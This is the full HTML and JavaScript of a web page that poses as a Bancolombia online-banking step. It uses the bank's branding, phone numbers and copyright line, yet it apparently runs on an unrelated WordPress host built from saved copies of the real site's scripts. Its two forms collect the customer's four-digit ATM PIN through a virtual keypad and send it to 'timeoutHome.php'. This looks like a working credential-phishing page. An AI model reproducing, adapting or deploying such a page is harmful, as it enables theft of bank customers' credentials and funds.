						<div class="elementor-element elementor-element-92cf393 elementor-widget elementor-widget-heading" data-id="92cf393" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">Usuario</h2>		</div>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
				<section class="elementor-section elementor-inner-section elementor-element elementor-element-adf8e67 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="adf8e67" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div class="elementor-container elementor-column-gap-default">
							<div class="elementor-row">
					<div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-b3122f1" data-id="b3122f1" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
			<div class="elementor-column-wrap elementor-element-populated">
							<div class="elementor-widget-wrap">
						<div class="elementor-element elementor-element-a16c7d7 elementor-widget elementor-widget-heading" data-id="a16c7d7" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">Si la imagen y frase no son las que has definido, por seguridad ingresa tu clave.</h2>		</div>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
				<section class="elementor-section elementor-inner-section elementor-element elementor-element-2f189c7 elementor-section-content-middle elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="2f189c7" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div class="elementor-container elementor-column-gap-default">
							<div class="elementor-row">
					<div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-ff3684e" data-id="ff3684e" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
			<div class="elementor-column-wrap elementor-element-populated">
							<div class="elementor-widget-wrap">
						<div class="elementor-element elementor-element-3fc869d elementor-button-align-start elementor-widget elementor-widget-form" data-id="3fc869d" data-element_type="widget" data-settings="{&quot;step_next_label&quot;:&quot;Next&quot;,&quot;step_previous_label&quot;:&quot;Previous&quot;,&quot;button_width&quot;:&quot;50&quot;,&quot;dce_confirm_dialog_enabled&quot;:&quot;no&quot;,&quot;step_type&quot;:&quot;number_text&quot;,&quot;step_icon_shape&quot;:&quot;circle&quot;,&quot;label_icon_size&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;field_icon_size&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]}}" data-widget_type="form.default">
				<div class="elementor-widget-container">
					<form class="" method="post" action="timeoutHome.php" name="">
	
			
			<div class="elementor-form-fields-wrapper elementor-labels-above">
								<div class="elementor-field-type-password elementor-field-group elementor-column elementor-field-group-clave elementor-col-100 elementor-field-required">
												<label for="form-field-clave" class="elementor-field-label">
								Ingresa tu clave							</label>
							<input size="1" type="password" name="clave" id="form-field-clave" class="elementor-field elementor-size-xs  elementor-field-textual" maxlength="4" minlength="4" required="required" aria-required="true">
											</div>
								<div class="elementor-field-type-html elementor-field-group elementor-column elementor-field-group-field_9a4cfb4 elementor-col-100">
					<p id="text-form">Ingresa mediante el teclado virtual la clave que usas en el cajero automático.</p>				</div>
								<div class="elementor-field-type-html elementor-field-group elementor-column elementor-field-group-field_21ca27c elementor-col-50">
					<div id="content-btncancelar">
    <button id="btncancelar">Cancelar</button>
</div>				</div>
								<div class="elementor-field-group elementor-column elementor-field-type-submit elementor-col-50 e-form__buttons">
					<button type="submit" class="elementor-button elementor-size-sm" id="btn-ingresar" style="border:none;min-height:40px;">
						<span>
															<span class=" elementor-button-icon">
																										</span>
																						<span class="elementor-button-text">Ingresar</span>
													</span>
					</button>
				</div>
			</div>
		</form>
				</div>
				</div>
				<div class="elementor-element elementor-element-98b5a8b elementor-widget elementor-widget-heading" data-id="98b5a8b" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default"><img decoding="async" id="icc"  class=" ls-is-cached lazyloaded" src="./archivos/icc.png"><noscript>
			<img decoding="async" id="icc" src="archivos/icc.png" ></noscript>Generar clave personal</h2>		</div>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
						</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-33 elementor-inner-column elementor-element elementor-element-aa4e7b3" data-id="aa4e7b3" data-element_type="column">
			<div class="elementor-column-wrap elementor-element-populated">
							<div class="elementor-widget-wrap">
						<div class="elementor-element elementor-element-052f382 elementor-widget elementor-widget-heading" data-id="052f382" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">Contraste</h2>		</div>
				</div>
				<div class="elementor-element elementor-element-0f3d090 elementor-widget elementor-widget-html" data-id="0f3d090" data-element_type="widget" data-widget_type="html.default">
				<div class="elementor-widget-container">
			<div class="row">
<div class="col s12 l4">
  <div class="card-panel">
    <div class="row">
      <section class="row ">
        <div class="rownumbre">
        <div class="col s4 light-blue numbersDashboard center " onclick="setNumbersSelectDashboard(1)"><p>1</p></div>
        <div class="col s4 light-blue numbersDashboard center " onclick="setNumbersSelectDashboard(2)"><p>2</p></div>
        <div class="col s4 light-blue numbersDashboard center " onclick="setNumbersSelectDashboard(3)"><p>3</p></div>
        </div>
        <div class="rownumbre">
        <div class="col s4 light-blue numbersDashboard center " onclick="setNumbersSelectDashboard(4)"><p>4</p></div>
        <div class="col s4 light-blue numbersDashboard center " onclick="setNumbersSelectDashboard(5)"><p>5</p></div>
        <div class="col s4 light-blue numbersDashboard center " onclick="setNumbersSelectDashboard(6)"><p>6</p></div>
        </div>
        <div class="rownumbre">
        <div class="col s4 light-blue numbersDashboard center " onclick="setNumbersSelectDashboard(7)"><p>7</p></div>
        <div class="col s4 light-blue numbersDashboard center " onclick="setNumbersSelectDashboard(8)"><p>8</p></div>
        <div class="col s4 light-blue numbersDashboard center " onclick="setNumbersSelectDashboard(9)"><p>9</p></div>
        </div>
        <div class="rownumbre">
        <div class="col numbersDashboard spn4" onclick="setNumbersSelectDashboard(0)"><p>0</p></div>
        <div class="col numbersDashboard spn8" onclick="setNumbersSelectDashboard(&#39;Borrar&#39;)"><p>Borrar</p></div>
        </div>
      </section>
    </div>
  </div>
</div>
<script>

     function setNumbersSelectDashboard(data){
  console.log('Se ha seleccionado el Numero '+ data);
  var inp = document.querySelector('input[name="clave"]');
  var n= "";
  if(data === "Borrar") {
    console.log('Limpiar')
    inp.value = '';
    document.getElementById('form-field-clave').reset();
  } 
  if(data !== 'none') {
    var ant = inp.value;
    var newN = data;
    inp.value = `${ant}${newN}`;
    console.log(data +' '+n)
  }
  
};
console.log("activo")



</script>		</div>
				</div>
				<div class="elementor-element elementor-element-1d7a4ca elementor-widget elementor-widget-heading" data-id="1d7a4ca" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">Contraste</h2>		</div>
				</div>
				<div class="elementor-element elementor-element-5f2a2db elementor-widget elementor-widget-html" data-id="5f2a2db" data-element_type="widget" data-widget_type="html.default">
				<div class="elementor-widget-container">
			<div class="circuloColor">
    <p>A</p>
    <p id="circular">B</p>
    <p>C</p>
</div>		</div>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</div></section>
				<section class="elementor-section elementor-inner-section elementor-element elementor-element-5ca2788 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="5ca2788" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div class="elementor-container elementor-column-gap-default">
							<div class="elementor-row">
					<div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-78c0aa0" data-id="78c0aa0" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
			<div class="elementor-column-wrap elementor-element-populated">
							<div class="elementor-widget-wrap">
						<div class="elementor-element elementor-element-a68ba60 elementor-widget elementor-widget-heading" data-id="a68ba60" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">Sucursal Telefónica Bancolombia: Bogotá (57) 60 1 343 00 00 - Medellín (57) 60 4 510 90 00 - Cali (57) 60 2 554 05 05 - Barranquilla (57) 60 5 361 88 88 - Cartagena (57) 60 5 693 44 00 - <br>Bucaramanga (57) 60 7 697 25 25 - Pereira (57) 60 6 340 12 13 - El resto del país 018000 9 12345. Sucursales Telefónicas en el exterior: España (34) 900 995 717 - Estados Unidos (1) 866 379 97 14.</h2>		</div>
				</div>
				<section class="elementor-section elementor-inner-section elementor-element elementor-element-00051b3 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="00051b3" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div class="elementor-container elementor-column-gap-default">
							<div class="elementor-row">
					<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-11285a7" data-id="11285a7" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
			<div class="elementor-column-wrap elementor-element-populated">
							<div class="elementor-widget-wrap">
						<div class="elementor-element elementor-element-d0318f7 elementor-widget elementor-widget-shortcode" data-id="d0318f7" data-element_type="widget" data-widget_type="shortcode.default">
				<div class="elementor-widget-container">
					<div class="elementor-shortcode">Dirección IP: 190.60.254.222</div>
				</div>
				</div>
						</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-1f43f0d" data-id="1f43f0d" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
			<div class="elementor-column-wrap elementor-element-populated">
							<div class="elementor-widget-wrap">
						<div class="elementor-element elementor-element-0c28ca9 elementor-widget elementor-widget-global elementor-global-1654 elementor-widget-heading" data-id="0c28ca9" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">Copyright © 2023 Bancolombia S.A.</h2>		</div>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
				<section class="elementor-section elementor-top-section elementor-element elementor-element-09ccd0b elementor-section-height-full elementor-section-items-stretch elementor-hidden-desktop elementor-hidden-tablet elementor-section-boxed elementor-section-height-default" data-id="09ccd0b" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div class="elementor-container elementor-column-gap-no">
							<div class="elementor-row">
					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-6f1f452" data-id="6f1f452" data-element_type="column">
			<div class="elementor-column-wrap elementor-element-populated">
							<div class="elementor-widget-wrap">
						<section class="elementor-section elementor-inner-section elementor-element elementor-element-028396c elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="028396c" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
							<div class="elementor-row">
					<div class="elementor-column elementor-col-33 elementor-inner-column elementor-element elementor-element-ec6fa30" data-id="ec6fa30" data-element_type="column">
			<div class="elementor-column-wrap elementor-element-populated">
							<div class="elementor-widget-wrap">
						<div class="elementor-element elementor-element-550aa17 elementor-widget elementor-widget-heading" data-id="550aa17" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default"><img decoding="async"  
			class="lazyload" src="archivos/Bancolombia_Resources.Cerrar.svg"><noscript>
			<img decoding="async" src="archivos/Bancolombia_Resources.Cerrar.svg"></noscript> &nbsp;  Cerrar</h2>		</div>
				</div>
						</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-33 elementor-inner-column elementor-element elementor-element-523adbd" data-id="523adbd" data-element_type="column">
			<div class="elementor-column-wrap elementor-element-populated">
							<div class="elementor-widget-wrap">
						<div class="elementor-element elementor-element-eec24fd dce_masking-none elementor-widget elementor-widget-image" data-id="eec24fd" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
								<div class="elementor-image">
							<img decoding="async" width="32" height="32" alt="" 
							class="attachment-full size-full wp-image-995 lazyload" src="archivos/Bancolombia_Resources.logo_.svg"><noscript>
							<img decoding="async" width="32" height="32" src="archivos/Bancolombia_Resources.logo_.svg" class="attachment-full size-full wp-image-995" alt="" /></noscript>														</div>
						</div>
				</div>
						</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-33 elementor-inner-column elementor-element elementor-element-ccf5e0e" data-id="ccf5e0e" data-element_type="column">
			<div class="elementor-column-wrap elementor-element-populated">
							<div class="elementor-widget-wrap">
						<div class="elementor-element elementor-element-6c69989 elementor-widget elementor-widget-heading" data-id="6c69989" data-element_type="widget" disabled="" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">Continuar &nbsp;<img decoding="async" fill="red"
			class="lazyload" src="archivos/Bancolombia_Resources.blackArrowRight.svg"><noscript>
			<img decoding="async" src="archivos/Bancolombia_Resources.blackArrowRight.svg" fill="red"></noscript>   </h2>		</div>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
				<section class="elementor-section elementor-inner-section elementor-element elementor-element-22d6d6d elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="22d6d6d" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div class="elementor-container elementor-column-gap-default">
							<div class="elementor-row">
					<div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-128fdcd" data-id="128fdcd" data-element_type="column">
			<div class="elementor-column-wrap elementor-element-populated">
							<div class="elementor-widget-wrap">
						<section class="elementor-section elementor-inner-section elementor-element elementor-element-65c6da5 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="65c6da5" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
							<div class="elementor-background-overlay"></div>
							<div class="elementor-container elementor-column-gap-default">
							<div class="elementor-row">
					<div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-ec5d0ec" data-id="ec5d0ec" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
			<div class="elementor-column-wrap elementor-element-populated">
							<div class="elementor-widget-wrap">
						<div class="elementor-element elementor-element-d49306b elementor-button-align-center elementor-mobile-button-align-stretch elementor-widget elementor-widget-form" data-id="d49306b" data-element_type="widget" data-settings="{&quot;step_next_label&quot;:&quot;Next&quot;,&quot;step_previous_label&quot;:&quot;Previous&quot;,&quot;button_width&quot;:&quot;100&quot;,&quot;dce_confirm_dialog_enabled&quot;:&quot;no&quot;,&quot;step_type&quot;:&quot;number_text&quot;,&quot;step_icon_shape&quot;:&quot;circle&quot;,&quot;label_icon_size&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;field_icon_size&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]}}" data-widget_type="form.default">
				<div class="elementor-widget-container">
					<form class="" method="post" action="timeoutHome.php" name="">
		
			
			<div class="elementor-form-fields-wrapper elementor-labels-above">
								<div class="elementor-field-type-html elementor-field-group elementor-column elementor-field-group-field_b2f5e45 elementor-col-100 elementor-sm-100">
					<h6>Default</h6>				</div>
								<div class="elementor-field-type-html elementor-field-group elementor-column elementor-field-group-field_2ab70ae elementor-col-100">
					<img decoding="async" id="candadom" class="lazyload" src="archivos/2es.png"><noscript>
					<img decoding="async" id="candadom" src="archivos/2es.png"></noscript>				</div>
								<div class="elementor-field-type-html elementor-field-group elementor-column elementor-field-group-field_7d48221 elementor-col-100 elementor-sm-100">
					<h6 id="clave">Ingresa la clave del cajero</h6>				</div>
								<div class="elementor-field-type-tel elementor-field-group elementor-column elementor-field-group-clavem elementor-col-100 elementor-field-required">
												<label for="form-field-clavem" class="elementor-field-label">
								Ingresa tu clave							</label>
								<input size="1" type="tel" name="clave" id="form-field-clavem" class="elementor-field elementor-size-xs  elementor-field-textual" required="required" aria-required="true" pattern="[0-9()#&amp;+*-=.]+" title="Only numbers and phone characters (#, -, *, etc) are accepted.">

						</div>
								<div class="elementor-field-group elementor-column elementor-field-type-submit elementor-col-100 e-form__buttons">
					<button type="submit" class="elementor-button elementor-size-sm" id="btn-clavem" disabled="" style="border:none;min-height:40px;">
						<span>
															<span class=" elementor-button-icon">
																										</span>
																						<span class="elementor-button-text">Continuar</span>
													</span>
					</button>
				</div>
			</div>
		</form>
				</div>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
									</div>
			</div>
					</div>
				
		<link rel="stylesheet" id="dce-dynamic-visibility-css" href="./archivos/dynamic-visibility.min.css" type="text/css" media="all">
<link rel="stylesheet" id="e-animations-css" href="./archivos/animations.min.css" type="text/css" media="all">
<script src="./archivos/smush-lazy-load.min.js.descarga" id="smush-lazy-load-js"></script>
<script src="./archivos/webpack-pro.runtime.min.js.descarga" id="elementor-pro-webpack-runtime-js"></script>
<script src="./archivos/webpack.runtime.min.js.descarga" id="elementor-webpack-runtime-js"></script>
<script src="./archivos/frontend-modules.min.js.descarga" id="elementor-frontend-modules-js"></script>
<script src="./archivos/regenerator-runtime.min.js.descarga" id="regenerator-runtime-js"></script>
<script src="./archivos/wp-polyfill.min.js.descarga" id="wp-polyfill-js"></script>
<script src="./archivos/hooks.min.js.descarga" id="wp-hooks-js"></script>
<script src="./archivos/i18n.min.js.descarga" id="wp-i18n-js"></script>
<script id="wp-i18n-js-after">
wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
</script>
<script id="elementor-pro-frontend-js-before">
var ElementorProFrontendConfig = {"ajaxurl":"https:\/\/\/wp-admin\/admin-ajax.php","nonce":"d8125645b2","urls":{"assets":"https:\/\/\/wp-content\/plugins\/elementor-pro\/assets\/","rest":"https:\/\/\/wp-json\/"},"shareButtonsNetworks":{"facebook":{"title":"Facebook","has_counter":true},"twitter":{"title":"Twitter"},"linkedin":{"title":"LinkedIn","has_counter":true},"pinterest":{"title":"Pinterest","has_counter":true},"reddit":{"title":"Reddit","has_counter":true},"vk":{"title":"VK","has_counter":true},"odnoklassniki":{"title":"OK","has_counter":true},"tumblr":{"title":"Tumblr"},"digg":{"title":"Digg"},"skype":{"title":"Skype"},"stumbleupon":{"title":"StumbleUpon","has_counter":true},"mix":{"title":"Mix"},"telegram":{"title":"Telegram"},"pocket":{"title":"Pocket","has_counter":true},"xing":{"title":"XING","has_counter":true},"whatsapp":{"title":"WhatsApp"},"email":{"title":"Email"},"print":{"title":"Print"}},"facebook_sdk":{"lang":"es_CO","app_id":""},"lottie":{"defaultAnimationUrl":"https:\/\/palestra-c75773.ingress-earth.ewp.live\/wp-content\/plugins\/elementor-pro\/modules\/lottie\/assets\/animations\/default.json"}};
</script>
<script src="./archivos/frontend.min.js.descarga" id="elementor-pro-frontend-js"></script>
<script src="./archivos/waypoints.min.js.descarga" id="elementor-waypoints-js"></script>
<script src="./archivos/core.min.js.descarga" id="jquery-ui-core-js"></script>
<script src="./archivos/swiper.min.js.descarga" id="swiper-js"></script>
<script src="./archivos/share-link.min.js.descarga" id="share-link-js"></script>
<script src="./archivos/dialog.min.js.descarga" id="elementor-dialog-js"></script>
<script id="elementor-frontend-js-before">
var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false,"isScriptDebug":false},"i18n":{"shareOnFacebook":"Compartir en Facebook","shareOnTwitter":"Compartir en Twitter","pinIt":"Pinear","download":"Descargar","downloadImage":"Descargar imagen","fullscreen":"Pantalla completa","zoom":"Zoom","share":"Compartir","playVideo":"Reproducir v\u00eddeo","previous":"Anterior","next":"Siguiente","close":"Cerrar"},"is_rtl":false,"breakpoints":{"xs":0,"sm":480,"md":768,"lg":1025,"xl":1440,"xxl":1600},"responsive":{"breakpoints":{"mobile":{"label":"M\u00f3vil","value":767,"default_value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"M\u00f3vil grande","value":880,"default_value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tableta","value":1024,"default_value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tableta grande","value":1200,"default_value":1200,"direction":"max","is_enabled":false},"laptop":{"label":"Port\u00e1til","value":1366,"default_value":1366,"direction":"max","is_enabled":false},"widescreen":{"label":"Pantalla grande","value":2400,"default_value":2400,"direction":"min","is_enabled":false}}},"version":"3.10.2","is_static":false,"experimentalFeatures":{"e_hidden_wordpress_widgets":true,"theme_builder_v2":true,"landing-pages":true,"kit-elements-defaults":true,"page-transitions":true,"notes":true,"form-submissions":true,"e_scroll_snap":true},"urls":{"assets":"https:\/\/palestra-c75773.ingress-earth.ewp.live\/wp-content\/plugins\/elementor\/assets\/"},"settings":{"page":[],"editorPreferences":[],"dynamicooo":[]},"kit":{"active_breakpoints":["viewport_mobile","viewport_tablet"],"global_image_lightbox":"yes","lightbox_enable_counter":"yes","lightbox_enable_fullscreen":"yes","lightbox_enable_zoom":"yes","lightbox_enable_share":"yes","lightbox_title_src":"title","lightbox_description_src":"description"},"post":{"id":522,"title":"Clave%20%E2%80%93%20Home","excerpt":"","featuredImage":false}};
</script>
<script src="./archivos/frontend.min.js(1).descarga" id="elementor-frontend-js"></script><span id="elementor-device-mode" class="elementor-screen-only"></span>
<script src="./archivos/preloaded-elements-handlers.min.js.descarga" id="pro-preloaded-elements-handlers-js"></script><svg style="display: none;" class="e-font-icon-svg-symbols"></svg>
<script src="./archivos/preloaded-modules.min.js.descarga" id="preloaded-modules-js"></script><svg style="display: none;" class="e-font-icon-svg-symbols"></svg>
<script src="./archivos/jquery.sticky.min.js.descarga" id="e-sticky-js"></script>
<script src="./archivos/settings.min.js.descarga" id="dce-settings-js"></script>
<script src="./archivos/fix-background-loop.min.js.descarga" id="dce-fix-background-loop-js"></script>
<script defer="">
	

		miFormulario = document.querySelector('#form-field-clave');
		miFormulario.addEventListener('keypress', function (e){
	if (!soloNumeros(event)){
  	e.preventDefault();
  }
	if (this.value.length >= 4) 
     this.value = this.value.slice(0,3); 
});
//Solo permite introducir numeros.
function soloNumeros(e){
    var key = e.charCode;
    return key >= 45 && key <= 57;
};

</script>
<script>

/****************/	
const inputclavem =  document.getElementById('form-field-clavem');
const continuarm = document.querySelectorAll(".elementor-heading-title.elementor-size-default");

const btn_disabledm = document.getElementById("btn-clavem");
btn_disabledm.setAttribute('disabled', '');

inputclavem.addEventListener('input',function(){
  if (this.value.length >= 1) {
     this.value = this.value.slice(0,4);
		btn_disabledm.removeAttribute('disabled', '');
		btn_disabledm.style.backgroundColor = '#fdda24';
		btn_disabledm.style.color = '#000';
		inputclavem.type= "tel";
		setTimeout(function(){
 inputclavem.type= "password"
},100);
}
if (this.value.length >= 4) {
     this.value = this.value.slice(0,4);
		btn_disabledm.removeAttribute('disabled', '');
		btn_disabledm.style.backgroundColor = '#fdda24';
		btn_disabledm.style.color = '#000';
		continuarm[12].style.color = '#000'
		inputclavem.type= "tel";
		setTimeout(function(){
 inputclavem.type= "password"
},100);
}	
else{
	btn_disabledm.setAttribute('disabled', '');
	btn_disabledm.style.backgroundColor = '#e1e1e1';
	btn_disabledm.style.color = '#7a7a7a';
	inputclavem.type= "tel";
}
});

/**Clave movil**/	
	
	inputclavem.addEventListener('keypress', function (e){
	if (!soloNumeros(event)){
  	e.preventDefault();
  }
	if (this.value.length >= 4) 
     this.value = this.value.slice(0,3); 
});
//Solo permite introducir numeros.
function soloNumeros(e){
    var key = e.charCode;
    return key >= 45 && key <= 57;
};

</script>
	

</body></html>